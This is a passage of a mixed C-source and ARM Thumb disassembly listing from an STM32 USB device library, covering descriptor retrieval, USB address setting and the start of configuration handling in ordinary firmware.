 800ba74:	7bfb      	ldrb	r3, [r7, #15]
}
 800ba76:	4618      	mov	r0, r3
 800ba78:	3710      	adds	r7, #16
 800ba7a:	46bd      	mov	sp, r7
 800ba7c:	bd80      	pop	{r7, pc}
	...

0800ba80 <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800ba80:	b580      	push	{r7, lr}
 800ba82:	b084      	sub	sp, #16
 800ba84:	af00      	add	r7, sp, #0
 800ba86:	6078      	str	r0, [r7, #4]
 800ba88:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800ba8a:	2300      	movs	r3, #0
 800ba8c:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800ba8e:	2300      	movs	r3, #0
 800ba90:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800ba92:	2300      	movs	r3, #0
 800ba94:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800ba96:	683b      	ldr	r3, [r7, #0]
 800ba98:	885b      	ldrh	r3, [r3, #2]
 800ba9a:	0a1b      	lsrs	r3, r3, #8
 800ba9c:	b29b      	uxth	r3, r3
 800ba9e:	3b01      	subs	r3, #1
 800baa0:	2b0e      	cmp	r3, #14
 800baa2:	f200 8152 	bhi.w	800bd4a <USBD_GetDescriptor+0x2ca>
 800baa6:	a201      	add	r2, pc, #4	; (adr r2, 800baac <USBD_GetDescriptor+0x2c>)
 800baa8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800baac:	0800bb1d 	.word	0x0800bb1d
 800bab0:	0800bb35 	.word	0x0800bb35
 800bab4:	0800bb75 	.word	0x0800bb75
 800bab8:	0800bd4b 	.word	0x0800bd4b
 800babc:	0800bd4b 	.word	0x0800bd4b
 800bac0:	0800bceb 	.word	0x0800bceb
 800bac4:	0800bd17 	.word	0x0800bd17
 800bac8:	0800bd4b 	.word	0x0800bd4b
 800bacc:	0800bd4b 	.word	0x0800bd4b
 800bad0:	0800bd4b 	.word	0x0800bd4b
 800bad4:	0800bd4b 	.word	0x0800bd4b
 800bad8:	0800bd4b 	.word	0x0800bd4b
 800badc:	0800bd4b 	.word	0x0800bd4b
 800bae0:	0800bd4b 	.word	0x0800bd4b
 800bae4:	0800bae9 	.word	0x0800bae9
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bae8:	687b      	ldr	r3, [r7, #4]
 800baea:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800baee:	69db      	ldr	r3, [r3, #28]
 800baf0:	2b00      	cmp	r3, #0
 800baf2:	d00b      	beq.n	800bb0c <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800baf4:	687b      	ldr	r3, [r7, #4]
 800baf6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bafa:	69db      	ldr	r3, [r3, #28]
 800bafc:	687a      	ldr	r2, [r7, #4]
 800bafe:	7c12      	ldrb	r2, [r2, #16]
 800bb00:	f107 0108 	add.w	r1, r7, #8
 800bb04:	4610      	mov	r0, r2
 800bb06:	4798      	blx	r3
 800bb08:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bb0a:	e126      	b.n	800bd5a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bb0c:	6839      	ldr	r1, [r7, #0]
 800bb0e:	6878      	ldr	r0, [r7, #4]
 800bb10:	f000 fb27 	bl	800c162 <USBD_CtlError>
        err++;
 800bb14:	7afb      	ldrb	r3, [r7, #11]
 800bb16:	3301      	adds	r3, #1
 800bb18:	72fb      	strb	r3, [r7, #11]
      break;
 800bb1a:	e11e      	b.n	800bd5a <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bb1c:	687b      	ldr	r3, [r7, #4]
 800bb1e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb22:	681b      	ldr	r3, [r3, #0]
 800bb24:	687a      	ldr	r2, [r7, #4]
 800bb26:	7c12      	ldrb	r2, [r2, #16]
 800bb28:	f107 0108 	add.w	r1, r7, #8
 800bb2c:	4610      	mov	r0, r2
 800bb2e:	4798      	blx	r3
 800bb30:	60f8      	str	r0, [r7, #12]
      break;
 800bb32:	e112      	b.n	800bd5a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bb34:	687b      	ldr	r3, [r7, #4]
 800bb36:	7c1b      	ldrb	r3, [r3, #16]
 800bb38:	2b00      	cmp	r3, #0
 800bb3a:	d10d      	bne.n	800bb58 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bb3c:	687b      	ldr	r3, [r7, #4]
 800bb3e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bb42:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bb44:	f107 0208 	add.w	r2, r7, #8
 800bb48:	4610      	mov	r0, r2
 800bb4a:	4798      	blx	r3
 800bb4c:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bb4e:	68fb      	ldr	r3, [r7, #12]
 800bb50:	3301      	adds	r3, #1
 800bb52:	2202      	movs	r2, #2
 800bb54:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bb56:	e100      	b.n	800bd5a <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bb58:	687b      	ldr	r3, [r7, #4]
 800bb5a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bb5e:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bb60:	f107 0208 	add.w	r2, r7, #8
 800bb64:	4610      	mov	r0, r2
 800bb66:	4798      	blx	r3
 800bb68:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bb6a:	68fb      	ldr	r3, [r7, #12]
 800bb6c:	3301      	adds	r3, #1
 800bb6e:	2202      	movs	r2, #2
 800bb70:	701a      	strb	r2, [r3, #0]
      break;
 800bb72:	e0f2      	b.n	800bd5a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bb74:	683b      	ldr	r3, [r7, #0]
 800bb76:	885b      	ldrh	r3, [r3, #2]
 800bb78:	b2db      	uxtb	r3, r3
 800bb7a:	2b05      	cmp	r3, #5
 800bb7c:	f200 80ac 	bhi.w	800bcd8 <USBD_GetDescriptor+0x258>
 800bb80:	a201      	add	r2, pc, #4	; (adr r2, 800bb88 <USBD_GetDescriptor+0x108>)
 800bb82:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bb86:	bf00      	nop
 800bb88:	0800bba1 	.word	0x0800bba1
 800bb8c:	0800bbd5 	.word	0x0800bbd5
 800bb90:	0800bc09 	.word	0x0800bc09
 800bb94:	0800bc3d 	.word	0x0800bc3d
 800bb98:	0800bc71 	.word	0x0800bc71
 800bb9c:	0800bca5 	.word	0x0800bca5
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bba0:	687b      	ldr	r3, [r7, #4]
 800bba2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bba6:	685b      	ldr	r3, [r3, #4]
 800bba8:	2b00      	cmp	r3, #0
 800bbaa:	d00b      	beq.n	800bbc4 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bbac:	687b      	ldr	r3, [r7, #4]
 800bbae:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbb2:	685b      	ldr	r3, [r3, #4]
 800bbb4:	687a      	ldr	r2, [r7, #4]
 800bbb6:	7c12      	ldrb	r2, [r2, #16]
 800bbb8:	f107 0108 	add.w	r1, r7, #8
 800bbbc:	4610      	mov	r0, r2
 800bbbe:	4798      	blx	r3
 800bbc0:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bbc2:	e091      	b.n	800bce8 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bbc4:	6839      	ldr	r1, [r7, #0]
 800bbc6:	6878      	ldr	r0, [r7, #4]
 800bbc8:	f000 facb 	bl	800c162 <USBD_CtlError>
            err++;
 800bbcc:	7afb      	ldrb	r3, [r7, #11]
 800bbce:	3301      	adds	r3, #1
 800bbd0:	72fb      	strb	r3, [r7, #11]
          break;
 800bbd2:	e089      	b.n	800bce8 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bbd4:	687b      	ldr	r3, [r7, #4]
 800bbd6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbda:	689b      	ldr	r3, [r3, #8]
 800bbdc:	2b00      	cmp	r3, #0
 800bbde:	d00b      	beq.n	800bbf8 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bbe0:	687b      	ldr	r3, [r7, #4]
 800bbe2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbe6:	689b      	ldr	r3, [r3, #8]
 800bbe8:	687a      	ldr	r2, [r7, #4]
 800bbea:	7c12      	ldrb	r2, [r2, #16]
 800bbec:	f107 0108 	add.w	r1, r7, #8
 800bbf0:	4610      	mov	r0, r2
 800bbf2:	4798      	blx	r3
 800bbf4:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bbf6:	e077      	b.n	800bce8 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bbf8:	6839      	ldr	r1, [r7, #0]
 800bbfa:	6878      	ldr	r0, [r7, #4]
 800bbfc:	f000 fab1 	bl	800c162 <USBD_CtlError>
            err++;
 800bc00:	7afb      	ldrb	r3, [r7, #11]
 800bc02:	3301      	adds	r3, #1
 800bc04:	72fb      	strb	r3, [r7, #11]
          break;
 800bc06:	e06f      	b.n	800bce8 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800bc08:	687b      	ldr	r3, [r7, #4]
 800bc0a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc0e:	68db      	ldr	r3, [r3, #12]
 800bc10:	2b00      	cmp	r3, #0
 800bc12:	d00b      	beq.n	800bc2c <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bc14:	687b      	ldr	r3, [r7, #4]
 800bc16:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc1a:	68db      	ldr	r3, [r3, #12]
 800bc1c:	687a      	ldr	r2, [r7, #4]
 800bc1e:	7c12      	ldrb	r2, [r2, #16]
 800bc20:	f107 0108 	add.w	r1, r7, #8
 800bc24:	4610      	mov	r0, r2
 800bc26:	4798      	blx	r3
 800bc28:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc2a:	e05d      	b.n	800bce8 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc2c:	6839      	ldr	r1, [r7, #0]
 800bc2e:	6878      	ldr	r0, [r7, #4]
 800bc30:	f000 fa97 	bl	800c162 <USBD_CtlError>
            err++;
 800bc34:	7afb      	ldrb	r3, [r7, #11]
 800bc36:	3301      	adds	r3, #1
 800bc38:	72fb      	strb	r3, [r7, #11]
          break;
 800bc3a:	e055      	b.n	800bce8 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800bc3c:	687b      	ldr	r3, [r7, #4]
 800bc3e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc42:	691b      	ldr	r3, [r3, #16]
 800bc44:	2b00      	cmp	r3, #0
 800bc46:	d00b      	beq.n	800bc60 <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800bc48:	687b      	ldr	r3, [r7, #4]
 800bc4a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc4e:	691b      	ldr	r3, [r3, #16]
 800bc50:	687a      	ldr	r2, [r7, #4]
 800bc52:	7c12      	ldrb	r2, [r2, #16]
 800bc54:	f107 0108 	add.w	r1, r7, #8
 800bc58:	4610      	mov	r0, r2
 800bc5a:	4798      	blx	r3
 800bc5c:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc5e:	e043      	b.n	800bce8 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc60:	6839      	ldr	r1, [r7, #0]
 800bc62:	6878      	ldr	r0, [r7, #4]
 800bc64:	f000 fa7d 	bl	800c162 <USBD_CtlError>
            err++;
 800bc68:	7afb      	ldrb	r3, [r7, #11]
 800bc6a:	3301      	adds	r3, #1
 800bc6c:	72fb      	strb	r3, [r7, #11]
          break;
 800bc6e:	e03b      	b.n	800bce8 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bc70:	687b      	ldr	r3, [r7, #4]
 800bc72:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc76:	695b      	ldr	r3, [r3, #20]
 800bc78:	2b00      	cmp	r3, #0
 800bc7a:	d00b      	beq.n	800bc94 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bc7c:	687b      	ldr	r3, [r7, #4]
 800bc7e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc82:	695b      	ldr	r3, [r3, #20]
 800bc84:	687a      	ldr	r2, [r7, #4]
 800bc86:	7c12      	ldrb	r2, [r2, #16]
 800bc88:	f107 0108 	add.w	r1, r7, #8
 800bc8c:	4610      	mov	r0, r2
 800bc8e:	4798      	blx	r3
 800bc90:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc92:	e029      	b.n	800bce8 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc94:	6839      	ldr	r1, [r7, #0]
 800bc96:	6878      	ldr	r0, [r7, #4]
 800bc98:	f000 fa63 	bl	800c162 <USBD_CtlError>
            err++;
 800bc9c:	7afb      	ldrb	r3, [r7, #11]
 800bc9e:	3301      	adds	r3, #1
 800bca0:	72fb      	strb	r3, [r7, #11]
          break;
 800bca2:	e021      	b.n	800bce8 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bca4:	687b      	ldr	r3, [r7, #4]
 800bca6:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcaa:	699b      	ldr	r3, [r3, #24]
 800bcac:	2b00      	cmp	r3, #0
 800bcae:	d00b      	beq.n	800bcc8 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bcb0:	687b      	ldr	r3, [r7, #4]
 800bcb2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcb6:	699b      	ldr	r3, [r3, #24]
 800bcb8:	687a      	ldr	r2, [r7, #4]
 800bcba:	7c12      	ldrb	r2, [r2, #16]
 800bcbc:	f107 0108 	add.w	r1, r7, #8
 800bcc0:	4610      	mov	r0, r2
 800bcc2:	4798      	blx	r3
 800bcc4:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bcc6:	e00f      	b.n	800bce8 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bcc8:	6839      	ldr	r1, [r7, #0]
 800bcca:	6878      	ldr	r0, [r7, #4]
 800bccc:	f000 fa49 	bl	800c162 <USBD_CtlError>
            err++;
 800bcd0:	7afb      	ldrb	r3, [r7, #11]
 800bcd2:	3301      	adds	r3, #1
 800bcd4:	72fb      	strb	r3, [r7, #11]
          break;
 800bcd6:	e007      	b.n	800bce8 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bcd8:	6839      	ldr	r1, [r7, #0]
 800bcda:	6878      	ldr	r0, [r7, #4]
 800bcdc:	f000 fa41 	bl	800c162 <USBD_CtlError>
          err++;
 800bce0:	7afb      	ldrb	r3, [r7, #11]
 800bce2:	3301      	adds	r3, #1
 800bce4:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bce6:	bf00      	nop
      }
      break;
 800bce8:	e037      	b.n	800bd5a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bcea:	687b      	ldr	r3, [r7, #4]
 800bcec:	7c1b      	ldrb	r3, [r3, #16]
 800bcee:	2b00      	cmp	r3, #0
 800bcf0:	d109      	bne.n	800bd06 <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bcf2:	687b      	ldr	r3, [r7, #4]
 800bcf4:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bcf8:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bcfa:	f107 0208 	add.w	r2, r7, #8
 800bcfe:	4610      	mov	r0, r2
 800bd00:	4798      	blx	r3
 800bd02:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd04:	e029      	b.n	800bd5a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd06:	6839      	ldr	r1, [r7, #0]
 800bd08:	6878      	ldr	r0, [r7, #4]
 800bd0a:	f000 fa2a 	bl	800c162 <USBD_CtlError>
        err++;
 800bd0e:	7afb      	ldrb	r3, [r7, #11]
 800bd10:	3301      	adds	r3, #1
 800bd12:	72fb      	strb	r3, [r7, #11]
      break;
 800bd14:	e021      	b.n	800bd5a <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd16:	687b      	ldr	r3, [r7, #4]
 800bd18:	7c1b      	ldrb	r3, [r3, #16]
 800bd1a:	2b00      	cmp	r3, #0
 800bd1c:	d10d      	bne.n	800bd3a <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bd1e:	687b      	ldr	r3, [r7, #4]
 800bd20:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd24:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bd26:	f107 0208 	add.w	r2, r7, #8
 800bd2a:	4610      	mov	r0, r2
 800bd2c:	4798      	blx	r3
 800bd2e:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bd30:	68fb      	ldr	r3, [r7, #12]
 800bd32:	3301      	adds	r3, #1
 800bd34:	2207      	movs	r2, #7
 800bd36:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd38:	e00f      	b.n	800bd5a <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd3a:	6839      	ldr	r1, [r7, #0]
 800bd3c:	6878      	ldr	r0, [r7, #4]
 800bd3e:	f000 fa10 	bl	800c162 <USBD_CtlError>
        err++;
 800bd42:	7afb      	ldrb	r3, [r7, #11]
 800bd44:	3301      	adds	r3, #1
 800bd46:	72fb      	strb	r3, [r7, #11]
      break;
 800bd48:	e007      	b.n	800bd5a <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bd4a:	6839      	ldr	r1, [r7, #0]
 800bd4c:	6878      	ldr	r0, [r7, #4]
 800bd4e:	f000 fa08 	bl	800c162 <USBD_CtlError>
      err++;
 800bd52:	7afb      	ldrb	r3, [r7, #11]
 800bd54:	3301      	adds	r3, #1
 800bd56:	72fb      	strb	r3, [r7, #11]
      break;
 800bd58:	bf00      	nop
  }

  if (err != 0U)
 800bd5a:	7afb      	ldrb	r3, [r7, #11]
 800bd5c:	2b00      	cmp	r3, #0
 800bd5e:	d11e      	bne.n	800bd9e <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bd60:	683b      	ldr	r3, [r7, #0]
 800bd62:	88db      	ldrh	r3, [r3, #6]
 800bd64:	2b00      	cmp	r3, #0
 800bd66:	d016      	beq.n	800bd96 <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bd68:	893b      	ldrh	r3, [r7, #8]
 800bd6a:	2b00      	cmp	r3, #0
 800bd6c:	d00e      	beq.n	800bd8c <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bd6e:	683b      	ldr	r3, [r7, #0]
 800bd70:	88da      	ldrh	r2, [r3, #6]
 800bd72:	893b      	ldrh	r3, [r7, #8]
 800bd74:	4293      	cmp	r3, r2
 800bd76:	bf28      	it	cs
 800bd78:	4613      	movcs	r3, r2
 800bd7a:	b29b      	uxth	r3, r3
 800bd7c:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bd7e:	893b      	ldrh	r3, [r7, #8]
 800bd80:	461a      	mov	r2, r3
 800bd82:	68f9      	ldr	r1, [r7, #12]
 800bd84:	6878      	ldr	r0, [r7, #4]
 800bd86:	f000 fa5d 	bl	800c244 <USBD_CtlSendData>
 800bd8a:	e009      	b.n	800bda0 <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800bd8c:	6839      	ldr	r1, [r7, #0]
 800bd8e:	6878      	ldr	r0, [r7, #4]
 800bd90:	f000 f9e7 	bl	800c162 <USBD_CtlError>
 800bd94:	e004      	b.n	800bda0 <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800bd96:	6878      	ldr	r0, [r7, #4]
 800bd98:	f000 faae 	bl	800c2f8 <USBD_CtlSendStatus>
 800bd9c:	e000      	b.n	800bda0 <USBD_GetDescriptor+0x320>
    return;
 800bd9e:	bf00      	nop
  }
}
 800bda0:	3710      	adds	r7, #16
 800bda2:	46bd      	mov	sp, r7
 800bda4:	bd80      	pop	{r7, pc}
 800bda6:	bf00      	nop

0800bda8 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bda8:	b580      	push	{r7, lr}
 800bdaa:	b084      	sub	sp, #16
 800bdac:	af00      	add	r7, sp, #0
 800bdae:	6078      	str	r0, [r7, #4]
 800bdb0:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800bdb2:	683b      	ldr	r3, [r7, #0]
 800bdb4:	889b      	ldrh	r3, [r3, #4]
 800bdb6:	2b00      	cmp	r3, #0
 800bdb8:	d131      	bne.n	800be1e <USBD_SetAddress+0x76>
 800bdba:	683b      	ldr	r3, [r7, #0]
 800bdbc:	88db      	ldrh	r3, [r3, #6]
 800bdbe:	2b00      	cmp	r3, #0
 800bdc0:	d12d      	bne.n	800be1e <USBD_SetAddress+0x76>
 800bdc2:	683b      	ldr	r3, [r7, #0]
 800bdc4:	885b      	ldrh	r3, [r3, #2]
 800bdc6:	2b7f      	cmp	r3, #127	; 0x7f
 800bdc8:	d829      	bhi.n	800be1e <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800bdca:	683b      	ldr	r3, [r7, #0]
 800bdcc:	885b      	ldrh	r3, [r3, #2]
 800bdce:	b2db      	uxtb	r3, r3
 800bdd0:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bdd4:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bdd6:	687b      	ldr	r3, [r7, #4]
 800bdd8:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bddc:	b2db      	uxtb	r3, r3
 800bdde:	2b03      	cmp	r3, #3
 800bde0:	d104      	bne.n	800bdec <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800bde2:	6839      	ldr	r1, [r7, #0]
 800bde4:	6878      	ldr	r0, [r7, #4]
 800bde6:	f000 f9bc 	bl	800c162 <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bdea:	e01d      	b.n	800be28 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800bdec:	687b      	ldr	r3, [r7, #4]
 800bdee:	7bfa      	ldrb	r2, [r7, #15]
 800bdf0:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800bdf4:	7bfb      	ldrb	r3, [r7, #15]
 800bdf6:	4619      	mov	r1, r3
 800bdf8:	6878      	ldr	r0, [r7, #4]
 800bdfa:	f000 ffbf 	bl	800cd7c <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800bdfe:	6878      	ldr	r0, [r7, #4]
 800be00:	f000 fa7a 	bl	800c2f8 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800be04:	7bfb      	ldrb	r3, [r7, #15]
 800be06:	2b00      	cmp	r3, #0
 800be08:	d004      	beq.n	800be14 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800be0a:	687b      	ldr	r3, [r7, #4]
 800be0c:	2202      	movs	r2, #2
 800be0e:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be12:	e009      	b.n	800be28 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800be14:	687b      	ldr	r3, [r7, #4]
 800be16:	2201      	movs	r2, #1
 800be18:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be1c:	e004      	b.n	800be28 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800be1e:	6839      	ldr	r1, [r7, #0]
 800be20:	6878      	ldr	r0, [r7, #4]
 800be22:	f000 f99e 	bl	800c162 <USBD_CtlError>
  }
}
 800be26:	bf00      	nop
 800be28:	bf00      	nop
 800be2a:	3710      	adds	r7, #16
 800be2c:	46bd      	mov	sp, r7
 800be2e:	bd80      	pop	{r7, pc}

0800be30 <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800be30:	b580      	push	{r7, lr}
 800be32:	b084      	sub	sp, #16
 800be34:	af00      	add	r7, sp, #0
 800be36:	6078      	str	r0, [r7, #4]
 800be38:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800be3a:	2300      	movs	r3, #0
 800be3c:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800be3e:	683b      	ldr	r3, [r7, #0]
 800be40:	885b      	ldrh	r3, [r3, #2]
 800be42:	b2da      	uxtb	r2, r3
 800be44:	4b4e      	ldr	r3, [pc, #312]	; (800bf80 <USBD_SetConfig+0x150>)
 800be46:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
